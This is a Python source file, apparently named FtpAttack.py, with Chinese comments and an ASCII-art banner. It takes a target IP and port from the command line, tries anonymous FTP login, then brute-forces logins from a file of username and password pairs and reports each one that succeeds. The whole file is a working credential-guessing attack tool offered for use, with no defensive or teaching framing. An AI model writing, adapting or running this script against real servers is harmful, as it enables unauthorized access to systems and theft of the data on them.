import ftplib
from optparse import OptionParser
import time

# 进行匿名登录
def anonLogin(target,port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target,port)
        ftp.login('anonymous','abcd')
        print('[+] %s:%d : Anonymous login successful'%(target,port))
        ftp.quit()
    except :
        print('[-] %s:%d : Anonymous login failed'%(target,port))

# 进行爆破登录
def blastLogin(target,port,file):
    # 得到用于爆破的用户名和密码
    f = open(file,'r')
    users = f.readlines()
    f.close()

    flag = False # 标志是否存在爆破成功

    # 进行爆破
    for user in users:
        user = user.rstrip('\n')
        time.sleep(0.2)
        try:
            ftp = ftplib.FTP()
            ftp.connect(target,port)
            ftp.login(user.split(' ')[0],user.split(' ')[-1])
            print('[+] %s:%d : %s %s login successful'%(target,port,user.split(' ')[0],user.split(' ')[-1]))
            flag = True
            ftp.quit()
        except :
            pass
    
    # 未爆破成功
    if not flag:
        print('[-] %s:%s : Blasting login failed'%(target,port))

if __name__ == "__main__":
    print("""
 /$$$$$$$$ /$$                /$$$$$$    /$$     /$$                         /$$      
| $$_____/| $$               /$$__  $$  | $$    | $$                        | $$      
| $$     /$$$$$$    /$$$$$$ | $$  \\ $$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$| $$   /$$
| $$$$$ |_  $$_/   /$$__  $$| $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/
| $$__/   | $$    | $$  \\ $$| $$__  $$  | $$    | $$      /$$$$$$$| $$      | $$$$$$/ 
| $$      | $$ /$$| $$  | $$| $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$ 
| $$      |  $$$$/| $$$$$$$/| $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \\  $$
|__/       \\___/  | $$____/ |__/  |__/   \\___/   \\___/   \\_______/ \\_______/|__/  \\__/
                  | $$                                                                
                  | $$                                                                
                  |__/                                                                
                  
                   /$$                       /$$                                      
                  | $$                      | $$                                      
                  | $$$$$$$  /$$   /$$      | $$   /$$ /$$   /$$                      
                  | $$__  $$| $$  | $$      | $$  |__/|  $$ /$$/                      
                  | $$  \\ $$| $$  | $$      | $$   /$$ \\  $$$$/                       
                  | $$  | $$| $$  | $$      | $$  | $$  >$$  $$                       
                  | $$$$$$$/|  $$$$$$$      | $$  | $$ /$$/\\  $$                      
                  |_______/  \\____  $$      |__/  | $$|__/  \\__/                      
                             /$$  | $$       /$$  | $$                                
                            |  $$$$$$/      |  $$$$$$/                                
                             \\______/        \\______/                                 
    """)
    # 设置命令行参数
    parse = OptionParser()
    parse.add_option('-t','--target',dest='target',help='The target ip')
    parse.add_option('-p','--port',dest='port',default=21,type='int',help='The ftp port')
    parse.add_option('-f','--file',dest='file',help='The name and passwd file')
    (options,args) = parse.parse_args()
    if options.target:
        print('[*] Try anonymous login\n')
        anonLogin(options.target,options.port)
        if options.file:
            print('\n[*] Try to blast login\n')
            blastLogin(options.target,options.port,options.file)
        else:
            print('\n[-] No dictionary, does not try blast login')
    else:
        parse.print_help()
        print('\nExample:')
        print('[#]-> python FtpAttack.py -t 127.0.0.1')
        print('[#]-> python FtpAttack.py -t 127.0.0.1 -p 26')
        print('[#]-> python FtpAttack.py -t 127.0.0.1 -f ftp.txt')